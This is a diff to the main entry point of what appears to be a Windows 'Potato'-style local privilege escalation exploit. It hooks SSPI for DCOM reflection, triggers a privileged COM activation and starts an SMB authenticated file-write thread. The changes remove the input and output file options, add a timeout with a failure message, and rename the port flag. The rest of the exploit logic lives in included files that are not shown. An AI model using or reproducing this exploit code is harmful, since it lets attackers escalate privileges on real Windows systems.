@@ -3,12 +3,8 @@
 #include "DCOMReflection.h"
 #include "PotatoTrigger.h"
 #include "SMBClient.h"
-#include <winternl.h>
-#include <Psapi.h>
-void usage();
-wchar_t* destfname;
-wchar_t* inputfname;
 
+void usage();
 
 int wmain(int argc, wchar_t** argv) 
 {
@@ -19,6 +15,7 @@ int wmain(int argc, wchar_t** argv)
 	WCHAR defaultComPort[] = L"12345";
 	PWCHAR clsidStr = defaultClsidStr;
 	PWCHAR comPort = defaultComPort;
+
 	int cnt = 1;
 	while ((argc > 1) && (argv[cnt][0] == '-'))
 	{
@@ -39,18 +36,6 @@ int wmain(int argc, wchar_t** argv)
 		case 'h':
 			usage();
 			exit(0);
-		case 'o':
-			++cnt;
-			--argc;
-			if (*argv[cnt] == '\\')
-				++argv[cnt];
-			destfname = argv[cnt];
-			break;
-		case 'i':
-			++cnt;
-			--argc;
-			inputfname = argv[cnt];
-			break;
 
 		default:
 			printf("Wrong Argument: %S\n", argv[cnt]);
@@ -63,7 +48,9 @@ int wmain(int argc, wchar_t** argv)
 	HANDLE hTread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SMBAuthenticatedFileWrite), NULL, 0, NULL);
 	HookSSPIForDCOMReflection();
 	PotatoTrigger(clsidStr, comPort, hTread);
-	WaitForSingleObject(hTread, INFINITE);
+	if (WaitForSingleObject(hTread, 3000) == WAIT_TIMEOUT) {
+		printf("[-] The privileged process failed to communicate with our COM Server :(");
+	}
 	return 0;
 }
 
@@ -72,6 +59,6 @@ void usage()
 	printf("\n");
 	printf("Args: \n"
 		"-c CLSID (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
-		"-p COM server port (Default 12345)\n"
+		"-r COM server port (Default 12345)\n"
 	);
 }
